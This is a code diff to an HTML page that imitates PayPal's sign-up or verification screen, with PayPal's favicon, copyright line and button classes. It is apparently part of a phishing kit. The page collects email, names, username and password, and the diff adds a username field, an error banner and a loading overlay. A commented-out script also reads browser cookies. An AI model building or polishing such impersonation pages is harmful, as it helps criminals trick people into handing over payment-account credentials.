@@ -32,13 +32,20 @@
 </style>
 
 <body>
+
+
+
+
+
+
     <div class="center">
         <img src="   ./images/paypalfavicon.png" alt="paypal">
 
         <div class="content">
-
+   
             <h1>Set up your profile</h1>
             This info needs to be accurate<br><br>
+            <div class="hider"> Something Went Wrong.</div>
             <input type="email" id="email" name="email" placeholder="Email Address">
             
             <!-- <br> -->
@@ -50,25 +57,34 @@
             <!-- <br>   -->
             <input type="text" id="last-name" name="Last Name" placeholder="Last Name">
             <!-- <br> -->
-            <div  class="hidethree">Please enter your last name.</div>
+            <div  class="hidethree">Please enter your last name.
+
+            </div>
+
+              <input type="text" id="user-name" name="user-name" placeholder="Username">
+                        <br>
+                        <div class="hidefive">Username is required.</div>
             <!-- <br> -->
             <input type="password" id="password" name="password" placeholder="Create your password">
             <!-- <br> -->
               <div class="hidefour"> Please enter a password to create an account.</div>
   
             <!-- <br> -->
-            <input type="password" id="checkpassword" name="checkpassword" placeholder="Confirm your password">
-<br>
-<div  class="hidefive">Your passwords don't match. Please retype your<br> password to confirm it.</div>
+
             <!-- <p id="next" class="next" onclick="alert('clicked')">Next</p> -->
             <!-- <p>By completing this you verify that you are the right owner of this account </p> -->
             <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin"
                 name="btnLogin" value="Login">Next</button>
         </div>
+
         <br><br><br><br>
         <!-- <a>Return to PayPal login</a> -->
         <p>©1999–2021 PayPal. All rights reserved.</p>
     </div>
+    <div class="overlay" id="overlay">
+        <div class="loader"></div>
+    </div>
+
 <script>
 //    const phone= document.cookie.split(';')
 //   let result=phone.forEach(phone=>console.log(phone.phone))
